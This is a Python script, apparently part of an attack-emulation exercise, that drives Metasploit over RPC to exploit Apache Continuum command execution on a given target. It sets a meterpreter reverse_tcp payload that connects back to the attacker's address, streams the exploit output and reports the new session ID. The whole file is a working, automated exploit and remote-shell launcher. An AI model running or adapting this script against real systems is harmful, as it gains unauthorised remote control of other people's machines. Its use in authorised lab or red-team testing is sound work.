import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def main(argv):
    # Arguments: 0=script, 1=folder, 2=my_ip, 3=target_ip
    if len(argv) < 4:
        print("[ERROR] Missing arguments.")
        print("Usage: python3 test_resource_hijacking.py <folder> <my_ip> <target_ip>")
        return

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    print(f"--- [Step 3: Resource Hijacking] Initial Access ---")
    print(f"Target: {target_ip} | Attacker: {my_ip}")

    # Sleep 60s (Script Requirement)
    print("Waiting 60s (Script Requirement)...")
    time.sleep(60)

    client = MsfRpcClient('kali')

    try:
        # 1. Record sessions before attack
        sessions_before = set(client.sessions.list.keys())
        print(f"Active Sessions Before Attack: {list(sessions_before)}")

        # 2. Create Console
        cid = client.consoles.console().cid
        console = client.consoles.console(cid)
        print(f"Console {cid} created.")

        # 3. Prepare Commands (Apache Continuum CMD Exec)
        commands = [
            'use exploit/linux/http/apache_continuum_cmd_exec',
            f'set RHOSTS {target_ip}',
            f'set LHOST {my_ip}',
            'set PAYLOAD linux/x86/meterpreter/reverse_tcp', # Explicitly set payload
            'set VERBOSE true',
            'run'
        ]

        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5)

        # 4. Stream Output (Polling Loop)
        print("--- Metasploit Exploit Output ---")
        max_wait_time = 120
        start_time = time.time()

        while True:
            result = console.read()
            data = result.get('data', '')

            if data:
                print(data, end='') # Stream to stdout

                if "Meterpreter session" in data and "opened" in data:
                    print("\n[+] Meterpreter session opened!")
                
                if "Exploit completed" in data or "Module execution completed" in data:
                    break

            if time.time() - start_time > max_wait_time:
                print("\n[!] Exploit execution timed out.")
                break

            time.sleep(1)

        # 5. Check for New Session
        print("\n--- Checking for New Session ---")
        time.sleep(10)

        sessions_after = set(client.sessions.list.keys())
        new_sessions = sessions_after - sessions_before

        if new_sessions:
            new_id = list(new_sessions)[0]
            print(f"[SUCCESS] New Session Created: {new_id}")
            print(f"NEW_SESSION_ID:{new_id}")
        else:
            print("[FAILURE] No new session created. Exploit likely failed.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'console' in locals():
            console.destroy()

    time.sleep(30)

if __name__ == "__main__":
    main(sys.argv)

